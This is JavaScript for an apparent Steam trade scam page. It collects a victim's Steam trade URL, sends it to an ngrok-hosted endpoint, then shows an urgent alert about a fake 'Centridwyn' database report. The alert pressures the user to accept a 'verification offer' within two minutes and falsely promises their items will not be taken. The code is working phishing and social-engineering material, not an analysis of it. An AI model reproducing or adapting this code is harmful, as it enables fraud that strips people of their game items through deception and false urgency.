const tradeURLInput = document.getElementById('tradeURL');
const submitBtn = document.getElementById('submitBtn');
const termsPopup = document.getElementById('termsPopup');
const agreeTerms = document.getElementById('agreeTerms');
const sendOffer = document.getElementById('sendOffer');
const confirmBtn = document.getElementById('confirmBtn');

tradeURLInput.addEventListener('input', function () {
  const url = tradeURLInput.value.trim();
  const isValid = url.startsWith("https");

  submitBtn.disabled = !isValid;

  let warning = document.getElementById('tradeWarning');
  if (!warning) {
    warning = document.createElement('div');
    warning.id = 'tradeWarning';
    warning.style.color = 'red';
    warning.style.fontSize = '13px';
    warning.style.marginTop = '-8px';
    warning.style.marginBottom = '10px';
    tradeURLInput.insertAdjacentElement('afterend', warning);
  }
  warning.textContent = isValid || url === '' ? '' : 'Please enter a valid Steam Trade URL.';
});

submitBtn.addEventListener('click', function () {
  termsPopup.style.display = 'flex';
});

function closePopup() {
  termsPopup.style.display = 'none';
}

function validateCheckboxes() {
  confirmBtn.disabled = !(agreeTerms.checked && sendOffer.checked);
}

agreeTerms.addEventListener('change', validateCheckboxes);
sendOffer.addEventListener('change', validateCheckboxes);
validateCheckboxes();

confirmBtn.addEventListener('click', function () {
  const tradeUrl = tradeURLInput.value.trim();
  const description = document.getElementById("descriptionBox")?.value || "";

  fetch("https://acad-103-187-245-43.ngrok-free.app/api/submit-appeal", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ tradeUrl, description })
  })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        alert(`⚠️ ATTENTION‼️‼️ ${data.itemsCount} Item(s) involve on the reports, Database named Centridwyn offer verification for the item(s) involved to be cleaned this will take 1 minute, Accept and confirm the offer on phone see results on email. Your items won't be taken away since a verification offer‼️ You have 2 minutes to comply.`);
      } else {
        alert(`❌ Failed: ${data.message}`);
      }
    })
    .catch(err => {
      alert("❌ Something went wrong.");
      console.error(err);
    });

  closePopup(); // hides popup after clicking
});
